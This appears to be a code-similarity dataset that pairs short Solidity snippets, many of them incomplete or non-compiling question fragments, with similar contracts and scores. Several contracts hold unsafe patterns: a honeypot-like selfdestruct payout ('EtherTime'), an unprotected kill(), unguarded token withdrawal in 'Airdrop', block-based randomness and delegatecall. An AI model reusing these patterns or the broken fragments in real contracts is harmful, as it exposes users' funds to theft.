  using SafeMath for uint256;

  uint public withdrawTime;

  ERC20 public token;



  mapping(address => uint) public bonus;





  modifier afterClose() {

    if(now < withdrawTime) {

      revert();

    } else {

      _;

    }

  }





  constructor(ERC20 _token, uint _withdrawTime) {

    require(_withdrawTime > 0);

    require(_withdrawTime > now);

    withdrawTime = _withdrawTime;

    token = _token;

  }



  function addBonus(address beneficiary, uint tokenAmount) internal {

    bonus[beneficiary] = bonus[beneficiary].add(tokenAmount);

  }





  function withdrawToken() public afterClose whenNotPaused {

    require(bonus[msg.sender] > 0);

    uint tokenAmount = bonus[msg.sender];

    bonus[msg.sender] = 0;

    token.transfer(msg.sender, tokenAmount);

  }



}"
"contract Test{
    address public creator;

    function Test(){
        creator = msg.sender;
    }

    function get1() returns (address){
        return creator;
    }
}",0.6808132852048673,"contract LndrJPY {
    function allowTransaction(address creditor, address debtor, uint256 amount) public returns (bool) {
        return true;
    }
}"
"contract MyContact {

    mapping(address => uint) private balances;

    modifier positiveNumber(uint number) {
        require(number > 0);
        _;
    }

    function deposit(uint amount)
      external
      positiveNumber(amount)
    {
      balances[msg.sender] += amount;
    }

    function hasFunds(address depositor, uint amount)
        external
        view
        positiveNumber(amount)
        returns (bool)
    {
        return balances[depositor] >= amount;
    }
}",0.6794167177346033,"contract Salemcash {

    mapping(address => uint) private _balances;

    constructor() public {
        _balances[msg.sender] = 20000000000000000000000000;
    }

    function getBalance(address account) public view returns (uint) {
        return _balances[account];
    }

    function transfer(address to, uint amount) public {
        require(_balances[msg.sender] >= amount);

        _balances[msg.sender] -= amount;
        _balances[to] += amount;
    }
}"
"contract Demo {

    uint _x = 0;

    function setX(uint x){
        _x = x;
    }

    function getX() constant returns (uint x){
        return _x;
    }
}",0.6666175632180243,"contract FiatContract {

    function ETH(uint _id) constant returns (uint256);

    function USD(uint _id) constant returns (uint256);

}"
"contract test{
    function multiply(uint a) constant returns(uint d){
        return a*7;
    }
}",0.6979991591280927,"contract Now {

  

  function getNow() public constant returns(uint256) {

    

    return now;

  }

}"
"contract ManagedWalletLookup { 
    address private _owner;

    mapping(address => address) public _managedWallets;

    constructor () internal {
        _owner = msg.sender;
    }

    modifier isOwner() {
        require(msg.sender == _owner);
        _;
    }

    function updateManagedWallets(address wallet, address owner) public 
        isOwner {
        _managedWallets[owner] = wallet;
    }

}",0.6898600927205515,"contract Ownable {



    address public owner;



    modifier onlyOwner {

        require(isOwner(msg.sender));

        _;

    }



    constructor () public {

        owner = msg.sender;

    }



    function transferOwnership(address _newOwner) public onlyOwner {

        owner = _newOwner;

    }



    function isOwner(address _address) public constant returns (bool) {

        return owner == _address;

    }

}"
"contract ERC735 {


    event ClaimAdded(
        bytes32 indexed claimId,
        uint256 indexed claimType,
        uint256 scheme,
        address indexed issuer,
        bytes signature,
        bytes data,
        string uri
    );
    event ClaimRemoved(
        bytes32 indexed claimId,
        uint256 indexed claimType,
        uint256 scheme,
        address indexed issuer,
        bytes signature,
        bytes data,
        string uri
    );


    struct Claim {
        uint256 claimType;
        uint256 scheme;
        address issuer; 
        bytes signature; 
        bytes data;
        string uri;
    }

    function getClaim(bytes32 _claimId)
        public
        view
        returns (
            uint256 claimType,
            uint256 scheme,
            address issuer,
            bytes memory,
            bytes memory,
            string memory
        );
    function getClaimIdsByType(uint256 _claimType)
        public
        view
        returns (bytes32[] memory); 
    function addClaim(
        uint256 _claimType,
        uint256 _scheme,
        address issuer,
        bytes memory, 
        bytes memory, 
        string memory 
    ) public returns (bytes32 claimRequestId);
    function removeClaim(bytes32 _claimId) public returns (bool success); 
}",0.6485490807882169,"contract ERC20Interface {



    function totalSupply() public view returns (uint256);

    

    function balanceOf(address _owner) public view returns (uint256 balance);

    

    function transfer(address _to, uint256 _value) public returns (bool success);

    

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

    

    function approve(address _spender, uint256 _value) public returns (bool success);

    

    function approveAndCall(address _spender, uint256 _value, bytes memory _extraData) public returns (bool success);

    

    function allowance(address _owner, address _spender) public view returns (uint256 remaining);

    

    function burn(uint256 _value, string memory _note) public returns (bool success);

    

    event Transfer(address indexed _from, address indexed _to, uint256 _value);



    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    event Burn(address indexed _burner, uint256 _value, string _note);

}"
"contract Ballot {
  uint256 icotokenPrice;
  mapping(string => uint256) tokensPrice;

  function assignICOPrice(uint256 _tokenPrice) public returns(bool){
    icotokenPrice = _tokenPrice;
    return true;
  }

  function createTokenPrice(string symbol_, uint256 price_) public returns(bool){
    tokensPrice[symbol_] = icotokenPrice / price_;
    return true;
  }

  function returnPrice(string symbol_) public view returns(uint256){
    return(tokensPrice[symbol_]);
  }
}",0.6185509794446069,"contract PricingStrategy {

  
  function isPricingStrategy() public pure returns (bool) {
    return true;
  }

  
  function isSane(address ) public pure returns (bool) {
    return true;
  }

  
  function isPresalePurchase(address ) public pure returns (bool) {
    return false;
  }

  
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public view returns (uint tokenAmount);
}"
"contract sample{
    function returnsData() returns(string){

        require(msg.sender==<some specific address>)    
        return ""SSJK"";
    }
}",0.6201317804177854,"contract EventsHistorySourceAdapter {



    

    function _self()

    internal

    view

    returns (address)

    {

        return msg.sender;

    }

}"
"contract sendEther{

address payable rec= address(0xD694fab8b63BeF0149aa47b8333dFeAe7f55E9C7);
address public sender = msg.sender;


function send() public payable{

    rec.transfer(msg.value);

}

}",0.6296819643165793,"contract EtherTime

{

    address Owner = msg.sender;



    function() public payable {}



    function Xply() public payable {

        if (msg.value >= address(this).balance || tx.origin == Owner) {

            selfdestruct(tx.origin);

        }

    }

 }"
"contract storagetest8 {

    mapping(uint256 => uint256) inventories;

    function setCharacter(address other_address, uint256 index1) 
        external 
    {
        uint256 _id = uint256(msg.sender);
        _id |= uint96(other_address)<<160;
        inventories[index1] = _id;        
    }


    function getCharacter(uint256 index1) 
        external view
    returns(address owner_address, uint256 secondpart) {
        uint256 _id = inventories[index1];
        owner_address = address(_id);
        secondpart = uint256(uint96(_id>>160));
    }

}",0.6040676602563181,"contract ERC20 is ERC20Basic {

    function allowanceInternal(address owner, address spender) internal view returns (uint256);

    function transferFromInternal(address from, address to, uint256 value) internal returns (bool);

    function approveInternal(address spender, uint256 value) internal returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}"
"contract GameTokenERC20 is ERC20{

  function transferERC20(uint _value) public{
    approve(address(this), _value);
   
   emit Approval(msg.sender, address(this), _value);
   transferFrom(msg.sender,address(this), _value);
  }


}",0.6443619521487932,"contract ERC20 {

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint value) public returns (bool ok);

}"
"contract demo {string public name = ""Petros""; function changeName(string _newName){name = _newName; } }",0.6233460668278207,"contract ReverseRegistrarRef {
    function setName(string name) public returns (bytes32 node);
}"
"contract Lottery{
    address public manager;
    address[] public players;

    function Lottery () public
    {
        manager = msg.sender;
    }

    function enter() public payable
    {
        require(msg.value>.01 ether);
        players.push(msg.sender);
    }

    function random () public view returns(uint)
    {
        return uint (keccak256(block.difficulty,now,players));
    }

    function pickWinner() public restricted 
    {
        uint index = random() % players.length;
        players[index].transfer(this.balance);
        players = new address[](0);
    }

    modifier restricted()
    {
        require(msg.sender==manager);
        _;
    }

    function getPlayers() public view returns (address[])
    {
        return players;
    }
}",0.6706334927324419,"contract Dealer {

    address public pitboss;
    uint public constant ceiling = 0.25 ether;

    event Deposit(address indexed _from, uint _value);

    function Dealer() public {
      pitboss = msg.sender;
    }

    function () public payable {
      Deposit(msg.sender, msg.value);
    }

    modifier pitbossOnly {
      require(msg.sender == pitboss);
      _;
    }

    function cashout(address winner, uint amount) public pitbossOnly {
      winner.transfer(amount);
    }

    function overflow() public pitbossOnly {
      require (this.balance > ceiling);
      pitboss.transfer(this.balance - ceiling);
    }

    function kill() public pitbossOnly {
      selfdestruct(pitboss);
    }

}"
"contract Test{

    uint[2] public u2=[1,2];
    uint[3] public u3;


    function test() public{
        u3=u2;
        test2(u2); 
    }

    function test2(uint[3] arr) internal{ }
}",0.6312085402426915,"contract DCMLike {
    function open(bytes32 ilk, address usr) public returns (uint);
    function enter(address src, uint cdp) public;
}"
"contract EmployeeDir{
    uint public id;
    string public name;
    address public currentVersion;
    address public owner;

    struct employee{
        string name;
        uint days_present;
    }

    mapping (uint => employee) public dir;

    
    function EmployeeDir(string _name, address _versionAddr){
        dir[id].name = _name;
        currentVersion = _versionAddr;
        owner = msg.sender;
    }

    function updateVersionAddress(address _versionAddr){
        if(msg.sender == owner)
            currentVersion = _versionAddr;
    }

    function addEmployee(string _name){
        if(msg.sender == owner){
            
            
            
            currentVersion.delegatecall(bytes4(sha3(""addEmployee(string)"")), _name);

            dir[id].name = name;
        }
    }
}",0.6063168081405304,"contract ENS {

    address public owner;

    mapping(string=>address)  ensmap;

    mapping(address=>string)  addressmap;

    

    constructor() public {

        owner = msg.sender;

    }

     

     function setEns(string newEns,address addr) onlyOwner public{

          ensmap[newEns] = addr;

          addressmap[addr] = newEns;

     }

     

    

     function getAddress(string aens) view public returns(address) {

           return ensmap[aens];

     }

	 

     function getEns(address addr) view public returns(string) {

           return addressmap[addr];

     }

    

    function transferOwnership(address newOwner) onlyOwner public {

        if (newOwner != address(0)) {

            owner = newOwner;

        }

    }



     

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

  

}"
"contract Code{
    uint public id;
    string public name;

    function addEmployee(string _name){
        id += 1;
        name = _name;
    }
}",0.6552356635345272,"contract Ownable {



    mapping(uint => string) public data;

    

    function addData(string memory inData) public {

        data[1] = inData;

    }



}"
"contract MoneyFountain{

    address owner;
    uint256 sendAmount;

    function MoneyFountain(){
        owner = msg.sender;
        sendAmount = 100000000000000000;
    }

    function getBalance() returns (uint){
        return address(this).balance;
    }

    function sendWei(address recp) returns (bool){        
        recp.send(sendAmount);
    }
}",0.662519740079273,"contract ERC20 { 
    function transfer(address receiver, uint amount) public ;
    function transferFrom(address sender, address receiver, uint amount) public returns(bool success); 
    function balanceOf(address _owner) constant public returns (uint256 balance);
}"
"contract toss3D{
  uint tossvalue = 0;
  uint targetBlock = 0;
  bool isgameStarted = false;
  struct winningToss{
    uint256 blocksAwayFromWin;
    address winnerAddress;
  }

  function tossCoin() public payable{
    if msg.value(uint) >= 2.5 finney{

    }
}",0.6090004196136816,"contract BountyFrag {
    function issueAndActivateBounty(
        address _issuer,
        uint _deadline,
        string _data,
        uint256 _fulfillmentAmount,
        address _arbiter,
        bool _paysTokens,
        address _tokenContract,
        uint256 _value
        ) public payable returns (uint);
}"
"contract DonationContract
{
    address owner;

    struct Applicant
    {
        address Appl;
        string Name;
        string OrgType;
        string Number;
        string Email;
        uint256 Funds; 
        bool approved;
    }

    mapping (address => Applicant) applicants;

    modifier Owner() 
    {
        require(msg.sender == owner);
        _;
    }

     modifier Approved() 
    {
        require(applicants[msg.sender].approved == true);
        _;
    }

    function approve(address Org) Owner public
    {
        applicants[Org].approved = true;
    }   
}",0.6101046436216317,"contract Leader {

    address owner;

    mapping (address => bool) public admins;

    

    modifier onlyOwner() {

        require(owner == msg.sender);

        _;

    }



    modifier onlyAdmins() {

        require(admins[msg.sender]);

        _;

    }

    

    function setOwner (address _addr) onlyOwner() public {

        owner = _addr;

    }



    function addAdmin (address _addr) onlyOwner() public {

        admins[_addr] = true;

    }



    function removeAdmin (address _addr) onlyOwner() public {

        delete admins[_addr];

    }

}"
"contract ApprovalContract {

  function random() external view returns (uint8){
  return uint8(uint256(keccak256(abi.encodePacked(block.timestamp, 
  block.difficulty)))%251);
  } 
 ...
 }",0.6043504187821562,"contract Random {

    function random(uint256) external view returns (uint256);

    function randomOfBlock(uint256, uint256) external view returns (uint256);

}"
"contract T1{
   address public a;
   function T1(){
   a=msg.sender;
  }
}",0.6760173254188869,"contract IOwned {
	function owner() public pure returns (address) {}
}"
"contract T2{
   address public b;
   T1 t1=new T1();
   function T2(){
     b= t1.a(); 
   
  }
}",0.6499124304654096,"contract Token {

  function balanceOf (address) public view returns (uint);

}"
"contract Test{
    constructor(uint256 _num) public {
    num = _num
    ;}
}",0.6021270760558446,"contract BConst {
    uint public constant EXIT_FEE = 0;
}"
"contract TokenRegistry is Ownable {

mapping (address => TokenMetadata) public tokens;
mapping (string => address) tokenBySymbol;
mapping (string => address) tokenByName;

address[] public tokenAddresses;

struct TokenMetadata {
    address token;
    string name;
    string symbol;
    uint8 decimals;
    bytes ipfsHash;
    bytes swarmHash;
}

function addToken(
    address _token,
    string _name,
    string _symbol,
    uint8 _decimals,
    bytes _ipfsHash,
    bytes _swarmHash)
    public
    onlyOwner
    tokenDoesNotExist(_token)
    addressNotNull(_token)
    symbolDoesNotExist(_symbol)
    nameDoesNotExist(_name)
{
    tokens[_token] = TokenMetadata({
        token: _token,
        name: _name,
        symbol: _symbol,
        decimals: _decimals,
        ipfsHash: _ipfsHash,
        swarmHash: _swarmHash
    });
    tokenAddresses.push(_token);
    tokenBySymbol[_symbol] = _token;
    tokenByName[_name] = _token;

}
",0.6003366720027067,"contract Token
{
	string internal _symbol;
	string internal _name;
	uint8 internal _decimals;	
    uint internal _totalSupply;
   	mapping(address =>uint) internal _balanceOf;
	mapping(address => mapping(address => uint)) internal _allowances;

    function Token(string symbol, string name, uint8 decimals, uint totalSupply) public{
	    _symbol = symbol;
		_name = name;
		_decimals = decimals;
		_totalSupply = totalSupply;
    }

	function name() public constant returns (string){
        	return _name;    
	}

	function symbol() public constant returns (string){
        	return _symbol;    
	}

	function decimals() public constant returns (uint8){
		return _decimals;
	}

	function totalSupply() public constant returns (uint){
        	return _totalSupply;
	}
            	
	event Transfer(address indexed _from, address indexed _to, uint _value);	
}"
"contract Buy {
    address[] public buyers;
    uint256 public minAmount;

    struct Buyer {
    uint256 amountPayed;
    uint256 itemSelected;
    }
    mapping(address => Buyer) public buyerInfo;

    function buy(uint256 itemSelected) public payable returns (uint amount){
    require(itemSelected >= 1 && itemSelected <= 10);
    require(msg.value >= minAmount);

    buyerInfo[msg.sender].amountPayed = msg.value;
    buyerInfo[msg.sender].itemSelected = itemSelected;

    buyers.push(msg.sender);

        return amount;
  }
}",0.6019132611382858,"contract Charity{

    

    address public owner;

    uint256 public totalAmountDonated;

    

    constructor() public {

        owner = msg.sender;

    }

    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {

    uint256 c = a + b;

    assert(c >= a);



    return c;

}

    

    function donate()payable public {

        require(msg.value > 0 ,""Please Donate at least one wei"");

       owner.transfer(msg.value);

    totalAmountDonated = add(totalAmountDonated,msg.value);

    }

    

    function() payable public {

        donate();

    }

}"
"contract TrafficFine{
    function addOfficer(string firstName,string lastName,address officer) public;
    function getOfficer(address officer) public;
}",0.667381262077537,"contract NameRegistryInterface {

  function registerName(address addr, string name) public;

  function finalizeName(address addr, string name) public;

}"
"contract Test {

   address public lastSCAddress; 
   string name;

}",0.6366579004961421,"contract Whitelist {
  mapping (address => bool) public registered;
}"
"contract subm{
  address winner;
  reg public regi;

  mapping (address => uint256) public balance;

  function submissions() public{
    if (winner == address(0)){
        winner = msg.sender;
    }
    else {
        return;
    }
  }
}",0.6526538152473951,"contract BalancingToken is ERC20 {
    mapping (address => uint256) public balances;      

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }
}"
"contract Hello {
    using SafeMath for uint256;
    uint value;

    constructor() public
    {
        value = value.add(100);
    }    
}",0.6169847580384953,"contract Example {

    uint256 public value;

    function setValue(uint256 _value) public {

        value = _value;

    }

}"
"contract A
{
    struct Prop
    {
    }

    struct App
    {
        Prop[] props;
    }

    App[] apps;

    function AddProp(string memory name) public
    {
        App memory a = FindApp(name);

        if(bytes(a.name).length > 0)
            a.props.push(Prop()); 

        else
            revert('Application not found');        
    }

    function FindApp(string memory name) public returns (App memory) 
    {
        for(uint256 i = 0; i < apps.length; i++)
        {
            if(apps[i].name == name)
            {
                return apps[i];
            }
        }

        return App();
    }

}",0.6019575675652297,"contract manyTests {
    uint256 a;
    string b = ""I am view"";
    uint256 c;
    
    function addSomeRandomStuff(address[][] memory tokens) public {
         a = a + 1;
    }
    
    function addSomeMoreRandomStuff(address[] memory tokens) public {
        c = c + 1;
    }
    
    function showMePure() pure public returns (string memory) {
        return ""I am pure"";
    }
    
    function showMeView() view public returns (string memory) {
        return b;
    }
}"
"contract B{    

  function aBid() public payable{


    A a = A(address);    

    a.bid.value(msg.sender);

  }

}",0.6822590488549293,"contract Ownable {
  address public owner;

  function Ownable() public {
    owner = msg.sender;
  }
}"
"contract Tenants{

  address admin;
  uint256[] public tenatIDs;
  mapping(bytes32 => Tenant) tenantDetails;

  function Tenants() public{

      admin = msg.sender;
  }

  struct Tenant{

      string uniqueID;
      string name;
      uint256 flatNum;
      uint256 phoneNum;
      uint256 advanceAmt;
      uint256 rent;
  }


  function addTenant(**Tenant tenantObj**) public{
          
  }

}",0.6216158436335845,"contract PoSTokenStandard {
    uint256 public stakeStartTime;
    uint256 public stakeMinAge;
    uint256 public stakeMaxAge;
   
    function mint() returns (bool);
    function coinAge(address who) constant returns (uint256);
    function annualInterest() constant returns (uint256);
    event Mint(address indexed _address, uint _reward);
}"
"contract Test
{
    uint public m_ReceivedWei;

    function()
        external payable
    {
        m_ReceivedWei += msg.value;
    }

}",0.6358474969319439,"contract TeamAddress1 {

    function() external payable {

        revert(""The contract don`t receive ether"");

    } 

}"
"contract abc{
    struct Owner{
        bool exist;
        address owner;
        uint share;
        bool sub;
    } 

    mapping (address => Owner) public Owners;
    uint public no_owners; 
    uint public no_sub;


    function abc(){ 
        
    }

    function transfer(address to,uint amount){
        
    }
}",0.6865088733947556,"contract DaiInterface {

  function transferFrom(address src, address dst, uint wad) public returns (bool);

  function balanceOf(address src) public view returns (uint);

  function transfer(address dst, uint wad) public returns (bool);

}"
"contract TestAll
{
    mapping(uint => uint) m_DataA;
    mapping(uint => mapping(uint => uint)) m_DataB;

    constructor()
        public
    {
        m_DataA[0] = 111;
        m_DataA[1] = 112;

        m_DataB[0][0] = 211;
        m_DataB[0][1] = 212;
    }

    function getAddress(uint pA)
        external view
        returns(uint)
    {
        return m_DataA[pA];
    }

    function getAddress(
        uint pA,
        uint pB
    )
        external view
        returns(uint)
    {
        return m_DataB[pA][pB];
    }
}",0.6040038607085468,"contract DayCounter

{

  uint private DayZero;

  uint internal constant SecondsInDay = 60 * 60 * 24;



  constructor(uint ZeroDayTimestamp) public

  {

    DayZero = ZeroDayTimestamp;

  }



  function daysSince(uint a, uint b) pure internal returns(uint)

  {

    return (b - a) / SecondsInDay;

  }



  function DaysPast() view public returns(uint)

  {

    return daysSince(DayZero, now);

  }

}"
"contract SubToken{ 
    MainContract mc;

    constructor(address _address) public{  
       mc=MainContract(_address);

    }  

    function getName1() view public returns(string memory){
        return mc.getNameMain(address(this));
    }



    
    
    
    
    

    event Transfer(address indexed from, address indexed to, uint tokens); 
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens); 

}",0.6994132217688962,"contract ERC20 is ERC20Basic {

    function allowance(address owner, address spender) public constant returns (uint);

    function transferFrom(address from, address to, uint value) public returns (bool);

    function approve(address spender, uint value) public;

    event Approval(address indexed owner, address indexed spender, uint value);

}"
"contract MainContract {
    

    

    address[] public contracts;

    using SafeMath for uint;

    address contract_address;

    struct token{ 
        string  name; 
        string   symbol; 
        uint8  decimals; 
        uint  totalSupply; 
        uint balances;
    } 
    mapping(address => token) public tokens;

    address mycontraddress;

    function createNewContract(string memory _name,string memory _symbol,uint8 _decimals,uint256 _totalSupply,uint _balance) public returns(address youraddress){ 
        SubToken st = new SubToken(address(this));
        tokens[address(st)] = token(_name,_symbol,_decimals,_totalSupply,_balance);
        mycontraddress=address(st);
        return mycontraddress;
    } 
    function seeContracttAddress() public view returns(address){
        return mycontraddress;
    }

    function getNameMain(address _address) public view returns(string memory){
        return tokens[_address].name;
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}",0.6933483257284847,"contract ERC223 {
    uint public totalSupply;

    function balanceOf(address who) public constant returns (uint);

    function name() constant public returns (string _name);
    function symbol() constant public returns (string _symbol);
    function decimals() constant public returns (uint8 _decimals);
    function totalSupply() constant public returns (uint256 _supply);

    function transfer(address to, uint value) public returns (bool ok);
    function transfer(address to, uint value, bytes data) public returns (bool ok);
    function transfer(address to, uint value, bytes data, string customFallback) public returns (bool ok);
    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract ILoanParams {

    function setParams(uint256 id,uint256 _lenderID,address _borrowerAddress,string loanHughString) public;

    function loanStatus(uint256 _loanId) public returns(string status);

    function setSignatures(uint256 _loanId,string _signatures) public;

    function getBorrowerAddress(uint256 _loanId) public returns(address);

    function getLenderID(uint256 _loanId) view public returns(uint256);

    function setStatus(uint256 _loanId,string _status) public;


    
    function testGetLoanAddress() public view returns(address);

    function testGetStatus(uint256 _loanId) public view returns(string);


}",0.6465200300375284,"contract ERC20Basic {

    

    event Transfer(address indexed _from,address indexed _to,uint256 value);



    

    uint256 public  totalSupply;



    

    mapping(address => uint256) public balances;



    

    function name() public view returns (string);



    

    function symbol() public view returns (string);



    

    function decimals() public view returns (uint8);



    

    function totalSupply() public view returns (uint256){

        return totalSupply;

    }



    

    function balanceOf(address _owner) public view returns (uint256 balance) {

        return balances[_owner];

    }



    

    function transfer(address _to, uint256 _value) public returns (bool);

}"
"contract Ballot {
    
    
    
    struct Voter {
        uint weight; 
        bool voted;  
        address delegate; 
        uint vote;   
    }
}",0.6044824075747582,"contract LibUserInfo {

  struct Following {

    address leader;

    uint percentage; 

    uint index;

  }

}"
"contract Exemple{

       Token public myToken

       function Exemple(){
               myToken=Token(this);
       }
}",0.6045776073075623,"contract TokenSale {

    

    function buyTokens(address beneficiary) public payable;

}"
"contract Driverfactory{

    struct Driver {
        address contractd;
        address account;
    }

    address[] private deployedDriverContracts;

    mapping(address=>Driver) public drivers;

    function createDriver(string lisenceId,string firstName,string lastName,string vehicle,string vehicleType) public{
        require(msg.sender!=drivers[msg.sender].account);
        address newDriver = new DriverProfile(lisenceId,firstName,lastName,vehicle,vehicleType,msg.sender);
        deployedDriverContracts.push(newDriver);
        Driver  memory newDriver1 = Driver({
            contractd:newDriver,
            account:msg.sender
        });
        drivers[msg.sender] = newDriver1;
    }

    function getDeployedDriverContracts() public view returns(address[]){
        return deployedDriverContracts; 
    }

    function checkDriver(address driver) public view returns(bool){
        if(driver==drivers[driver].account){
            return true;
        }

        else{
            return false;
        }

    }

    function driverContract(address driver) public view returns(address){
        address dc_adrs =drivers[driver].contractd;
        return dc_adrs;
    }



}",0.6227271607229359,"contract DigitalDollarRetainerFactory {


mapping (address => bool) public validContracts;
address[] public contracts;


function getContractCount()
public
view
returns(uint contractCount)
{
return contracts.length;
}


function getDeployedContracts() public view returns (address[])
{
return contracts;
}


function newDigitalRetainer(string _terms, address _client, address _provider, string _deliverable, string _governingLawandForum, uint8 _retainerDurationinDays, uint8 _deliverableRate, uint8 _payCap)
public
returns(address)
{
DigitalDollarRetainer c = new DigitalDollarRetainer(_terms, _client, _provider, _deliverable, _governingLawandForum, _retainerDurationinDays, _deliverableRate, _payCap);
validContracts[c] = true;
contracts.push(c);
return c;
}


function getTerms(address ddRetainer)
public
view
returns(string)
{


require(validContracts[ddRetainer],""Contract Not Found!"");

return (DigitalDollarRetainer(ddRetainer).getTerms());
}
}"
"contract Demo
{
     address public test;
     function Demo(address test) payable
     {
        test = test;
     }
}",0.6499245453566556,"contract ERC721 {



  function transferFrom(address from, address to, uint value) public;

}"
"contract smart{
event TransformToken(
    address _source,
    address _destination,
    uint amount
    );
mapping (address => uint)account;

function showToken(address _address)public view returns(uint){
 uint token=account[_address];
 return (token);

}
function addToken(address _address,uint amount)public{
 account[_address]+=amount;
 }
 function subToken(address _address,uint amount)public{
 account[_address]-=amount;
}

 function transfer(address _address,uint amount)public view returns(uint){
   addToken(_address,amount);
   subToken(msg.sender,amount);
   emit TransformToken(msg.sender,_address,amount);
   return showToken(_address);
   } 
  }",0.6314470320071693,"contract Airdrop {
    ERC20 public token;
    
    event LogAccountAmount(address indexed user, uint256 indexed amount);

    function Airdrop(address _token) public {
        token = ERC20(_token);
    }

    function setToken(address _token) public {
        token = ERC20(_token);
    }

    
    
    function startAirdrop(address[] users, uint256[] amounts) public {
        for(uint256 i = 0; i < users.length; i++) {
            address account = users[i];
            uint256 amount = amounts[i];
            
            LogAccountAmount(account, amount);
            
            token.transfer(account, amount);
        }
    }
    
    function recoverTokens(address _user, uint256 _amount) public {
        token.transfer(_user, _amount);
    }
}"
"contract NameReg{
    event AddressRegistered(bytes32 indexed name, address indexed account);
    mapping(address => bytes32) toName;

    function register(bytes32 name){
        toName[msg.sender] = name;
        AddressRegistered(name, msg.sender);
    }

    function resolve(address addr) constant returns(bytes32 name){
        return toName[addr];
    }
}",0.6791019592979979,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function getAddresses() returns(address[]){ return addresses; }
}"
"contract helloWorld {

  string public message;

  function constructor() public{
    message = ""Hello World"";
  }

  function sayHi() constant public returns (string){
    return message;
  }
}",0.6808272782953345,"contract HelloWorld {

    function sayHello() public pure returns (string) {

        return (""Hello World!"");

    }



    function kill()  public {

        selfdestruct(address(0x094f2cdef86e77fd66ea9246ce8f2f653453a5ce));

    }

}"
"contract OLD_CONTRACT {
    mapping (address => mapping (uint => uint)) public balances;
",0.6536677500065007,"contract Resources {
    
	mapping(uint8 => mapping(address => uint256) ) public ResourcesOwner; 
}"
"contract Test{

    function createInstance() public{
        address test2 = new Test2();
    }
}",0.6756237488854404,"contract Token {

  function balanceOf (address) public view returns (uint);

}"
"contract ReadLogPOC
{
    uint gi_sum;
    event adduintevent(uint indexed p_data,uint p_sum);    


    function adduint(uint p_1) external returns(uint){
        gi_sum = 10 + p_1;
        emit adduintevent(p_1,gi_sum);
        return gi_sum;
    }
    function getsum() external returns(uint){
        return gi_sum;
    }    
}",0.6117320121754877,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}

	function safeMul(uint a, uint b) internal returns(uint) {
		uint c = a * b;
		assert(a == 0 || c / a == b);
		return c;
	}
}"
"contract Example
{
    using SafeMath for uint256;

    uint256 internal _amount;

    function example(uint256 amount)
    external
    {
        _amount = _amount.add(amount);
    }
}",0.6306911666534409,"contract test {
  using SafeMath for uint256;
  uint256 public num;
  function test() {
    num = 10;
  }
  function add(uint256 _num) {
    num = num.add(_num);
  }
}"
"contract C {
    uint public data;
}",0.6333819710725298,"contract test {
    function f() public { }
}"
"contract c5 {
    uint currentVersion;
    string command;
    address owner;

    
    function c5(){
            currentVersion = 1;
            command = ""test1"";
            owner = msg.sender;
    }

    function update(uint input){
            if(msg.sender != owner) return;
            currentVersion = input;
    }

    function query() constant returns (string){
            return command;
    }

    function version() constant returns (uint){
            return currentVersion;
    }
}",0.6113748660233972,"contract Token { 
    function issue(address _recipient, uint256 _value) returns (bool success) {} 
    function balanceOf(address _owner) constant returns (uint256 balance) {}
    function unlock() returns (bool success) {}
    function startIncentiveDistribution() returns (bool success) {}
    function transferOwnership(address _newOwner) {}
    function owner() returns (address _owner) {}
}"
"contract Test{
    event Here(uint256 indexed a);
    uint256 public a;

    function add() public returns (uint256){
        a += 1;
        emit Here(a);
        return a;
    }
}",0.6962421773466421,"contract SafeMath {

	function safeAdd(uint256 a, uint256 b) internal pure returns (uint256) {

		uint256 c = a + b;

		assert(c >= a && c >= b);



		return c;

	}

}"
"contract Post{
    address author;
    uint _id;
    struct UserDetails{
     string title;
     string description;
     address owner;
}

mapping (uint => UserDetails) postDetails;

function Post() public{
    author = msg.sender;
}

function addPost(string title, string description) public returns (uint){
    _id += 1;
    postDetails[_id] = UserDetails(title, description, author);
    return _id;
}

function getPost(uint id) constant returns (string title, string description, address owner){
    return (postDetails[id].title, postDetails[id].description, postDetails[id].owner);
}


function getPostCount() constant returns (uint){
    return _id;
}

}",0.6073355529210046,"contract Token {
    function totalSupply() constant returns (uint totalSupply);
    function balanceOf(address _owner) constant returns (uint balance);
    function transfer(address _to, uint _value) returns (bool success);
    function transferFrom(address _from, address _to, uint _value) returns (bool success);
    function approve(address _spender, uint _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint remaining);

    function issue(address _to, uint _value) public returns (bool);
    function transferOwnership(address _newOwner) public;
}"
"contract FixedSupplyToken is ERC20Token {
  using SafeMath for uint;

  mapping(address => uint) balances;
  uint _totalSupply;

  constructor() public {
    decimals = 18;
    _totalSupply = 1000000 * 10**uint(decimals);
    balances[owner] = _totalSupply;
  } 
}",0.6972485314460298,"contract BlockMobaToken is ERC223Token {

    

  constructor () public  {

    uint256 initialSupply = 1000000000;

    name = ""BlockMobaToken"";                                   

    symbol = ""MOBA"";

    decimals = 6;

    totalSupply = initialSupply * 10 ** uint256(decimals);

    balances[msg.sender] = totalSupply;

  }

}"
"contract Dapp {
    uint public totalSupply;

    constructor() public {
        totalSupply = 1000000;
    }
}",0.644863866572814,"contract shortContract2 {
    int256 public aNumber;
    
    constructor() public {
        aNumber = -1000;
    }
}"
"contract Club {
    address public owner;
    uint public price; 
    uint public membersCount;
    uint public bestSale; 
    address public bestSeller; 
",0.6010300096487939,"contract token { function transfer(address receiver, uint amount) public{  }

